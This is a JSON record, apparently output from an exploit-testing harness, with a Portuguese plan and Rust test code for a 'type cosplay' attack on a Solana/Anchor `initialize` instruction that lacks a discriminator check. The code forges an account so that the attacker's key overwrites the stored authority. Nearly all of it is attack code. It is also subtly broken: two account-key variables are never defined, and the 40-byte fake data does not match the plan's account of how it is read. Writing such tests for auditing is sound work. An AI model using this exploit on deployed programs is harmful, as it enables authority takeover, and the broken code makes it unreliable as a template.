{
  "plan": "O programa-alvo `initialize` recebe uma conta `user` como `AccountInfo` e desserializa manualmente via `User::try_from_slice`, sem verificar discriminador. O baseline usa uma conta `user` com dados de 32 bytes (um Pubkey) e uma authority signer, provando que o cenario esta correto. O ataque fornece uma conta `user` cujos dados sao de outro tipo (por exemplo, uma conta com discriminador de 8 bytes seguido de um Pubkey), fazendo o programa interpretar os primeiros 32 bytes como `authority` e sobrescrever o campo. O efeito medido e que os primeiros 32 bytes da conta `user` apos o ataque sao iguais a chave da authority do atacante, demonstrando que dados de outro tipo foram aceitos como `User`.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta user legitima: 32 bytes (Pubkey) sem discriminador
let user_data = Pubkey::new_unique().to_bytes().to_vec();
let user_account = account(&env.program_id, &user_data, None);

let authority_account = wallet(1_000_000_000);

let ix = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(user_account_key, false),
    AccountMeta::new_readonly(authority, true),
]);

let contas = vec![
    (user_account_key, user_account),
    (authority, authority_account),
];

let baseline = env.baseline("initialize legitimo", &ix, &contas);

// Ataque: conta user com dados de outro tipo (discriminador de 8 bytes + Pubkey)
let fake_disc = [1u8, 2, 3, 4, 5, 6, 7, 8];
let mut fake_data = fake_disc.to_vec();
fake_data.extend_from_slice(&attacker.to_bytes());
let fake_user_account = account(&env.program_id, &fake_data, None);

let attack_ix = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(fake_user_account_key, false),
    AccountMeta::new_readonly(attacker, true),
]);

let attack_contas = vec![
    (fake_user_account_key, fake_user_account),
    (attacker, wallet(1_000_000_000)),
];

let r = env.attack("cosplay: conta de outro tipo aceita como User", &attack_ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &fake_user_account_key).data();
    let stored_authority = read_pubkey(data, 0);
    env.effect("authority sobrescrita com a chave do atacante", stored_authority == attacker);
}"
}

